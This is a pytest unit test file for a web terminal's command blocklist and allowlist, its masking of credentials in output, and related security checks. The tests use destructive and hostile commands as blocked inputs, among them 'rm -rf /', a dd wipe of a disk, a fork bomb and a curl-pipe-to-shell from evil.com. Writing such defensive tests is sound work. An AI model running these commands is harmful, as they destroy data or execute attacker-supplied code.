"""tests/unit/test_terminal.py — Tests for Web Terminal security and session management.

Tests cover:
- Command blocklist/allowlist enforcement
- Credential sanitization in terminal output
- Session lifecycle management
- RBAC access control
"""

from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

# Add API path for imports
sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "web-ui" / "api"))

from terminal_security import (
    TerminalSecurityGuard,
    CommandCheckResult,
    BLOCKED_PATTERNS,
    CREDENTIAL_PATTERNS,
    ALLOWED_COMMANDS,
)


# ═══════════════════════════════════════════════════════════
# Command Blocklist Tests
# ═══════════════════════════════════════════════════════════


class TestCommandBlocklist:
    """Test that dangerous commands are correctly blocked."""

    def setup_method(self) -> None:
        self.guard = TerminalSecurityGuard()

    def test_blocks_rm_rf_root(self) -> None:
        result = self.guard.check_command("rm -rf /")
        assert result.allowed is False
        assert "Blocked" in result.reason

    def test_blocks_shutdown(self) -> None:
        result = self.guard.check_command("shutdown now")
        assert result.allowed is False

    def test_blocks_reboot(self) -> None:
        result = self.guard.check_command("reboot")
        assert result.allowed is False

    def test_blocks_mkfs(self) -> None:
        result = self.guard.check_command("mkfs.ext4 /dev/sda1")
        assert result.allowed is False

    def test_blocks_dd_to_device(self) -> None:
        result = self.guard.check_command("dd if=/dev/zero of=/dev/sda")
        assert result.allowed is False

    def test_blocks_fork_bomb(self) -> None:
        result = self.guard.check_command(":(){ :|:& };:")
        assert result.allowed is False

    def test_blocks_curl_pipe_to_sh(self) -> None:
        result = self.guard.check_command("curl http://evil.com/script.sh | sh")
        assert result.allowed is False

    def test_blocks_sudo_su(self) -> None:
        result = self.guard.check_command("sudo su")
        assert result.allowed is False

    def test_blocks_passwd(self) -> None:
        result = self.guard.check_command("passwd root")
        assert result.allowed is False

    def test_blocks_useradd(self) -> None:
        result = self.guard.check_command("useradd hacker")
        assert result.allowed is False

    def test_blocks_iptables_flush(self) -> None:
        result = self.guard.check_command("iptables -F")
        assert result.allowed is False


# ═══════════════════════════════════════════════════════════
# Safe Commands Tests
# ═══════════════════════════════════════════════════════════


class TestSafeCommands:
    """Test that legitimate commands are allowed."""

    def setup_method(self) -> None:
        self.guard = TerminalSecurityGuard()

    def test_allows_terraform_plan(self) -> None:
        result = self.guard.check_command("terraform plan")
        assert result.allowed is True

    def test_allows_terraform_apply(self) -> None:
        result = self.guard.check_command("terraform apply -auto-approve")
        assert result.allowed is True

    def test_allows_aws_cli(self) -> None:
        result = self.guard.check_command("aws s3 ls")
        assert result.allowed is True

    def test_allows_infracost(self) -> None:
        result = self.guard.check_command("infracost breakdown --path .")
        assert result.allowed is True

    def test_allows_ls(self) -> None:
        result = self.guard.check_command("ls -la")
        assert result.allowed is True

    def test_allows_cat(self) -> None:
        result = self.guard.check_command("cat main.tf")
        assert result.allowed is True

    def test_allows_git_status(self) -> None:
        result = self.guard.check_command("git status")
        assert result.allowed is True

    def test_allows_python(self) -> None:
        result = self.guard.check_command("python3 --version")
        assert result.allowed is True

    def test_allows_empty_command(self) -> None:
        result = self.guard.check_command("")
        assert result.allowed is True

    def test_allows_whitespace_only(self) -> None:
        result = self.guard.check_command("   ")
        assert result.allowed is True


# ═══════════════════════════════════════════════════════════
# Credential Sanitization Tests
# ═══════════════════════════════════════════════════════════


class TestCredentialSanitization:
    """Test that credentials are properly masked in output."""

    def setup_method(self) -> None:
        self.guard = TerminalSecurityGuard()

    def test_masks_aws_access_key(self) -> None:
        output = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
        sanitized = self.guard.sanitize_output(output)
        assert "AKIAIOSFODNN7EXAMPLE" not in sanitized
        assert "REDACTED" in sanitized

    def test_masks_aws_secret_key(self) -> None:
        output = "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        sanitized = self.guard.sanitize_output(output)
        assert "wJalrXUtnFEMI" not in sanitized
        assert "REDACTED" in sanitized

    def test_masks_password(self) -> None:
        output = "password: MySecretP@ss123"
        sanitized = self.guard.sanitize_output(output)
        assert "MySecretP@ss123" not in sanitized
        assert "REDACTED" in sanitized

    def test_preserves_normal_output(self) -> None:
        output = "terraform plan completed: 3 to add, 0 to change"
        sanitized = self.guard.sanitize_output(output)
        assert sanitized == output

    def test_masks_akia_pattern(self) -> None:
        output = "Found key: AKIAIOSFODNN7EXAMPLE in config"
        sanitized = self.guard.sanitize_output(output)
        assert "AKIAIOSFODNN7EXAMPLE" not in sanitized


# ═══════════════════════════════════════════════════════════
# Allowlist Mode Tests
# ═══════════════════════════════════════════════════════════


class TestAllowlistMode:
    """Test the optional allowlist-only mode."""

    def setup_method(self) -> None:
        self.guard = TerminalSecurityGuard(use_allowlist=True)

    def test_allows_terraform_in_allowlist(self) -> None:
        result = self.guard.check_command("terraform plan")
        assert result.allowed is True

    def test_blocks_unknown_command(self) -> None:
        result = self.guard.check_command("some_random_binary --flag")
        assert result.allowed is False
        assert "not in allowed list" in result.reason

    def test_allows_aws_in_allowlist(self) -> None:
        result = self.guard.check_command("aws sts get-caller-identity")
        assert result.allowed is True


# ═══════════════════════════════════════════════════════════
# Security Info Tests
# ═══════════════════════════════════════════════════════════


class TestSecurityInfo:
    """Test the security info reporting."""

    def test_get_blocked_patterns_info(self) -> None:
        guard = TerminalSecurityGuard()
        info = guard.get_blocked_patterns_info()
        assert isinstance(info, list)
        assert len(info) > 0
        assert "pattern" in info[0]
        assert "reason" in info[0]

    def test_command_check_result_fields(self) -> None:
        result = CommandCheckResult(allowed=True, command="ls", reason="OK")
        assert result.allowed is True
        assert result.command == "ls"
        assert result.reason == "OK"
